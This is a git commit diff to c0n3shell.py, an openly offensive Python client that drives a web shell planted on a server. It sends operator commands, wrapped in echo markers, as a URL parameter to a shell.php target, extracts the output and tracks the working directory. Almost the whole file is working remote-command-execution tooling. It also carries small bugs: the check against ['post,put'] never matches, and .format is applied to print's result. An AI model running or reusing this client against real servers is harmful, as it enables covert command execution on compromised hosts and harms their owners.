2ad3ed2baaf6bc303343e4465081ad95c886263b
Lrk <sfxelrick@gmail.com>
2019-10-23 18:07:03 +0200

    add http_verb to options

--- c0n3shell.py
+++ c0n3shell.py
@@ -13,24 +13,21 @@ BANNER = """\033[01;32m\n
 """
 
 
-
 class C0n3Shell(Cmd):
 
-    # Shall we display the raw results ?
-    _http_verb = 'get'
-    _raw_results=False
-    _ignore_certs=None
-    _headers=None
-    _data=None
+    _headers = None
+    _data = None
 
     # _Cookies=None
     _options = {
+        'http_verb': 'get',
         'url': 'http://localhost/shell.php',
-        'attribute':'cmd',
+        'attribute': 'cmd',
         'raw': False,
-        'show_stderr':True,
-        'pwd':'',
-        'marker':'[c3n0]'
+        'show_stderr': True,
+        'pwd': '',
+        'marker': '[c3n0]',
+        'ignore_certs': True
     }
 
     def __init__(
@@ -43,104 +40,112 @@ class C0n3Shell(Cmd):
         data=None
         # ,
         # cookies=None
-        ):
+    ):
 
         self.updatePrompt()
-        self._http_verb = http_verb.lower() if http_verb != None and len(http_verb) > 0 else 'get'
-        self._options['url']=url
-        self._options['attribute']=attribute
-        self._ignore_certs=ignore_certs
-        self._headers=headers
-        self._data=data
+        self._options['http_verb'] = http_verb.lower(
+        ) if http_verb != None and len(http_verb) > 0 else 'get'
+        self._options['url'] = url
+        self._options['attribute'] = attribute
+        self._options['ignore_certs'] = ignore_certs
+        self._headers = headers
+        self._data = data
         # self._Cookies=cookies
         self.banner()
         Cmd.__init__(self)
         self.showOptions(None)
         self.getPwd()
 
-    def default(self,args):
+    def default(self, args):
         self.cmdHandler(args)
 
     def updatePrompt(self):
-        self.prompt = '\033[01;32m{} - {} \033[0m> '.format('c0n3',self._options['pwd'])
+        self.prompt = '\033[01;32m{} - {} \033[0m> '.format(
+            'c0n3', self._options['pwd'])
 
     def banner(self):
         print(BANNER)
         print('')
 
-    def cmdHandler(self,cmd):
-        if cmd != None and len(cmd)>0 and cmd.startswith('!'):
+    def cmdHandler(self, cmd):
+        if cmd != None and len(cmd) > 0 and cmd.startswith('!'):
             # internal commands
             cmdArray = cmd.split(' ')
             intCmd = cmdArray.pop(0)[1:]
             internal_command_handler = self._internal_commands.get(intCmd)
             if callable(internal_command_handler):
-                internal_command_handler(self,' '.join(cmdArray))
+                internal_command_handler(self, ' '.join(cmdArray))
             else:
                 print('[!] Unknown {}'.format(internal_command_handler))
         else:
             print(self.sendToShell(cmd))
 
     # Send command to webshell and display results
-    def sendToShell(self,cmd):
+    def sendToShell(self, cmd):
         payload = cmd
 
         try:
             if self._options['show_stderr']:
                 payload = '{} 2>&1'.format(payload)
             if not self._options['raw']:
-                payload = 'echo \'{}\';{};echo \'{}\''.format(self._options['marker'],payload,self._options['marker'])
+                payload = 'echo \'{}\';{};echo \'{}\''.format(
+                    self._options['marker'], payload, self._options['marker'])
 
-            print('[>] Sending payload: {}'.format(payload))
+            print('[!] Sending payload: {}'.format(payload))
             response = requests.request(
-                self._http_verb,
-                '{}?{}={}'.format(self._options['url'],self._options['attribute'],quote(payload)),
+                self._options['http_verb'],
+                '{}?{}={}'.format(
+                    self._options['url'], self._options['attribute'], quote(payload)),
                 headers=self._headers,
-                data=self._data if self._http_verb in ['post,put'] else None
-                )
+                data=self._data if self._options['http_verb'] in [
+                    'post,put'] else None
+            )
+
             if response.status_code == 200:
                 if self._options['raw']:
                     return response.text
                 else:
                     result = response.text
                     try:
-                        if result != None and len(result)>0:
-                            result = result[result.find(self._options['marker'])+len(self._options['marker'])+1:]
-                            result = result[:result.rfind(self._options['marker'])]
+                        if result != None and len(result) > 0:
+                            result = result[result.find(
+                                self._options['marker']) + len(self._options['marker']) + 1:]
+                            result = result[:result.rfind(
+                                self._options['marker'])]
                         return result
                     except:
                         return response.text
             else:
-                print('[!] Receive http code {}: {}').format(response.status_code,response.text)
-
+                print('[!] Receive http code {}: {}').format(
+                    response.status_code, response.text)
 
         except Exception as ex:
             print('[!] Error: {}'.format(ex))
 
-    def setOption(self,args):
+    def setOption(self, args):
         try:
             args = args.split(' ')
             self._options[args[0]] = args[1]
-            print('[>] {}: {}'.format(args[0],args[1]))
+            print('[>] {}: {}'.format(args[0], args[1]))
         except Exception as ex:
             print('[!] Error: {}'.format(ex))
             print('[>] Usage: set option value')
 
-    def showOptions(self,args):
+    def showOptions(self, args):
         print('[>] options:')
         for name, value in self._options.items():
-            print("\t{}: {}".format(name,value))
+            print("\t{}: {}".format(name, value))
 
     def getPwd(self):
-        path=self.sendToShell('pwd')
-        path='{}'.format(path)
-        path=path.strip()
-        if len(path)>0:
-            self._options['pwd']=path
+        path = self.sendToShell('pwd')
+        path = '{}'.format(path)
+        path = path.strip()
+        if len(path) > 0:
+            self._options['pwd'] = path
 
         self.updatePrompt()
 
-    def quitCmd(self,args):
+    def quitCmd(self, args):
         quit()
 
     def helpCmd(args):
